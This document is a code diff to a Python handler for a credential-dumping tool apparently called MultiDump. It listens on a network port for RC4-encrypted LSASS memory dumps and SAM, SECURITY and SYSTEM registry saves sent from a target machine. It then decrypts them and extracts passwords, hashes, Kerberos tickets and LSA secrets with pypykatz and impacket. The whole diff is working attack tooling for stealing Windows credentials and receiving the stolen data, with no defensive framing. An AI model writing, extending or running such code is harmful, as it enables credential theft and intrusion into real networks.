@@ -3,10 +3,14 @@
 import argparse
 import binascii
 import io
+import logging
+import os
 import socket
 import struct
 from datetime import datetime
 
+from impacket import version
+from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
 from pypykatz.pypykatz import pypykatz
 
 
@@ -162,24 +166,37 @@ def parse_dump(dump):
 def parse_arguments():
     parser = argparse.ArgumentParser(description="Handler for RemoteProcDump")
 
-    group = parser.add_mutually_exclusive_group(required=True)
-
-    group.add_argument(
+    # Define arguments
+    parser.add_argument(
         "-r", "--remote", type=int, help="Port to receive remote dump file"
     )
+    parser.add_argument("-l", "--local", help="Local dump file, key needed to decrypt")
+    parser.add_argument("--sam", help="Local SAM save, key needed to decrypt")
+    parser.add_argument("--security", help="Local SECURITY save, key needed to decrypt")
+    parser.add_argument("--system", help="Local SYSTEM save, key needed to decrypt")
+    parser.add_argument("-k", "--key", help="Key to decrypt local file")
     parser.add_argument(
         "--override-ip",
         help="Manually specify the IP address for key generation in remote mode, for proxied connection",
         type=str,
     )
 
-    group.add_argument("-l", "--local", help="Local dump file, key needed to decrypt")
-    parser.add_argument("-k", "--key", help="Key to decrypt local file")
-
     args = parser.parse_args()
 
+    # Check if either -r is set, -l is set, or all of --sam, --security, and --system are set
+    local_group_required = [args.sam, args.security, args.system]
+    if not any([args.remote, args.local]) and not all(local_group_required):
+        parser.error(
+            "Either -r/--remote, -l/--local, or all of --sam, --security, --system are required."
+        )
+
+    # Additional checks for -l/--local and --sam/--security/--system group usage
     if args.local and not args.key:
-        parser.error("-k/--key is required when -l/--local-file is used")
+        parser.error("-k/--key is required when -l/--local is used.")
+    if all(local_group_required) and not args.key:
+        parser.error(
+            "-k/--key is required when --sam, --security, and --system are specified."
+        )
 
     return args
 
@@ -238,16 +255,7 @@ def write_file(filepath, data):
     print(f"{TerminalColor.OKGREEN}[i] Saved as {filepath}{TerminalColor.ENDC}")
 
 
-def process_dump(raw_data, key):
-    if isinstance(key, str):
-        try:
-            key = bytes.fromhex(key)
-        except ValueError as e:
-            return (
-                None,
-                f"{TerminalColor.FAIL}[!] Error converting key: {e}{TerminalColor.ENDC}",
-            )
-
+def process_lsass_dump(raw_data, key):
     try:
         print(f"{TerminalColor.OKBLUE}[i] Decrypting dump data...{TerminalColor.ENDC}")
         decrypted_data = rc4_decrypt(key, raw_data)
@@ -276,7 +284,73 @@ def process_dump(raw_data, key):
         )
 
     print_creds(credentials, tickets, masterkeys)
-    return lsass_dump, f"{TerminalColor.OKGREEN}\n[+] All done!{TerminalColor.ENDC}"
+    return (
+        lsass_dump,
+        f"{TerminalColor.OKGREEN}\n[+] LSASS dump done!{TerminalColor.ENDC}",
+    )
+
+
+def dump_reg_secrets(sam_path, security_path, system_path):
+    # Initialize LocalOperations with the SYSTEM hive for the boot key
+    localOperations = LocalOperations(system_path)
+    bootKey = localOperations.getBootKey()
+
+    print(f"{TerminalColor.WARNING}[i] Dumping SAM hashes...{TerminalColor.ENDC}")
+    samHashes = SAMHashes(sam_path, bootKey, isRemote=False)
+    try:
+        samHashes.dump()
+    except Exception as e:
+        print(f"{TerminalColor.FAIL}Failed to dump SAM hashes: {e}{TerminalColor.ENDC}")
+
+    print(f"{TerminalColor.WARNING}[i] Dumping LSA Secrets...{TerminalColor.ENDC}")
+    try:
+        lsaSecrets = LSASecrets(security_path, bootKey, isRemote=False)
+        lsaSecrets.dumpCachedHashes()
+        lsaSecrets.dumpSecrets()
+    except Exception as e:
+        print(
+            f"{TerminalColor.FAIL}Failed to dump LSA Secrets: {e}{TerminalColor.ENDC}"
+        )
+
+
+def process_reg_dumps(sam, security, system, key_hex):
+    print(f"{TerminalColor.OKBLUE}[i] Decrypting registry saves...{TerminalColor.ENDC}")
+
+    decrypted_filenames = {
+        "sam": "sam.save",
+        "security": "security.save",
+        "system": "system.save",
+    }
+
+    def decrypt_and_save(input_var, key_hex, output_filename):
+        data = (
+            input_var if isinstance(input_var, bytes) else open(input_var, "rb").read()
+        )
+        decrypted_data = rc4_decrypt(key_hex, data)
+        with open(output_filename, "wb") as decrypted_file:
+            decrypted_file.write(decrypted_data)
+
+    decrypt_and_save(sam, key_hex, decrypted_filenames["sam"])
+    decrypt_and_save(security, key_hex, decrypted_filenames["security"])
+    decrypt_and_save(system, key_hex, decrypted_filenames["system"])
+
+    dump_reg_secrets(
+        decrypted_filenames["sam"],
+        decrypted_filenames["security"],
+        decrypted_filenames["system"],
+    )
+
+    response = input("Save the processed registry dump files? [Y/n] ").lower()
+    if response == "n":
+        for filename in decrypted_filenames.values():
+            os.remove(filename)
+            print(
+                f"{TerminalColor.WARNING}[i] {filename} has been deleted.{TerminalColor.ENDC}"
+            )
+    else:
+        print(
+            f"{TerminalColor.OKGREEN}[i] All files have been saved.{TerminalColor.ENDC}"
+        )
 
 
 def generate_key(ip, port):
@@ -330,72 +404,119 @@ def start_server(port, type, threshold_kb):
     client_socket.close()
     server_socket.close()
 
-    return received_data, local_ip, total_bytes_received
+    print(
+        f"{TerminalColor.OKGREEN}[+] Received {total_bytes_received / (1024 * 1024):.2f} MB{TerminalColor.ENDC}\n"
+    )
+    return received_data, local_ip
 
 
 def handle_remote_dump(args):
-    dump_data = None
+    lsass_data = None
+    sam_save = None
+    security_save = None
+    system_save = None
+    lsass_dump = False
+    reg_dump = False
 
     try:
-        enc_dump_key, local_ip, key_bytes_received = start_server(
-            args.remote, "encrypted key", 1
-        )
+        typed_rc4_key, local_ip = start_server(args.remote, "encrypted key", 1)
 
-        if len(enc_dump_key) != 64:
+        if len(typed_rc4_key) != 65:
             print(f"{TerminalColor.FAIL}[!] Key size mismatch!{TerminalColor.ENDC}")
             return  # Return early since the key size is incorrect
 
-        dump_data, local_ip, dump_bytes_received = start_server(
-            args.remote, "encrypted dump", 512000
-        )
-        print(
-            f"{TerminalColor.OKGREEN}[+] Received {dump_bytes_received / (1024 * 1024):.2f} MB{TerminalColor.ENDC}\n"
-        )
+        if typed_rc4_key[0] == 0:
+            lsass_dump = True
+            reg_dump = True
+        elif typed_rc4_key[0] == 1:
+            lsass_dump = True
+        elif typed_rc4_key[0] == 2:
+            reg_dump = True
+
+        enc_rc4_key = typed_rc4_key[1:65]
+
+        if reg_dump:
+            sam_save, local_ip = start_server(args.remote, "encrypted SAM save", 10240)
+
+            security_save, local_ip = start_server(
+                args.remote, "encrypted SECURITY save", 10240
+            )
+
+            system_save, local_ip = start_server(
+                args.remote, "encrypted SYSTEM save", 51200
+            )
+
+        if lsass_dump:
+            lsass_data, local_ip = start_server(
+                args.remote, "encrypted LSASS dump", 512000
+            )
 
         # Handle IP override or confirmation
         if args.override_ip:
-            dump_key_key = generate_key(args.override_ip, args.remote)
+            rc4_key_key = generate_key(args.override_ip, args.remote)
         else:
             response = input(
                 f"Detected IP: {local_ip}, does this match the IP used by MultiDump? [Y/n] "
             ).lower()
             if response == "n":
                 local_ip = input("Enter an IP: ")
-            dump_key_key = generate_key(local_ip, args.remote)
+            rc4_key_key = generate_key(local_ip, args.remote)
 
         # Attempt decryption
-        dump_key = rc4_decrypt(dump_key_key, enc_dump_key)
+        rc4_key = rc4_decrypt(rc4_key_key, enc_rc4_key)
         print(
-            f"{TerminalColor.OKBLUE}[i] Decrypted key: {binascii.hexlify(dump_key).decode()}{TerminalColor.ENDC}\n"
+            f"{TerminalColor.OKBLUE}[i] Decrypted key: {binascii.hexlify(rc4_key).decode()}{TerminalColor.ENDC}\n"
         )
 
-        # Process the dump
-        dump_data, message = process_dump(dump_data, dump_key)
-        print(message)
+        if reg_dump:
+            if sam_save != None and security_save != None and system_save != None:
+                process_reg_dumps(sam_save, security_save, system_save, rc4_key)
+
+        if lsass_dump:
+            lsass_data, message = process_lsass_dump(lsass_data, rc4_key)
+            print(message)
 
     except Exception as e:
         print(f"{TerminalColor.FAIL}[!] Error: {e}{TerminalColor.ENDC}")
     finally:
         # Ensure write_file is called even if there's an error
-        if dump_data:
-            response = input("Save the processed dump file? [Y/n] ").lower()
+        if lsass_data:
+            response = input("Save the processed files? [Y/n] ").lower()
             if response != "n":
-                write_file("lsass.dmp", dump_data)
+                write_file("lsass.dmp", lsass_data)
 
 
 def main():
     args = parse_arguments()
 
     if args.local and args.key:
+        try:
+            key = bytes.fromhex(args.key)
+        except ValueError as e:
+            print(
+                f"{TerminalColor.FAIL}[!] Error converting key: {e}{TerminalColor.ENDC}"
+            )
+            exit()
+
         enc_dump = read_file(args.local)
 
-        dump_data, message = process_dump(enc_dump, args.key)
+        dump_data, message = process_lsass_dump(enc_dump, key)
         print(message)
 
         if dump_data:
-            response = input("Save the processed dump file? [Y/n] ").lower()
+            response = input("Save the processed LSASS dump file? [Y/n] ").lower()
             if response != "n":
                 write_file("lsass.dmp", dump_data)
+
+    if args.sam and args.security and args.system and args.key:
+        try:
+            key = bytes.fromhex(args.key)
+        except ValueError as e:
+            print(
+                f"{TerminalColor.FAIL}[!] Error converting key: {e}{TerminalColor.ENDC}"
+            )
+            exit()
+        process_reg_dumps(args.sam, args.security, args.system, key)
 
     elif args.remote:
         handle_remote_dump(args)
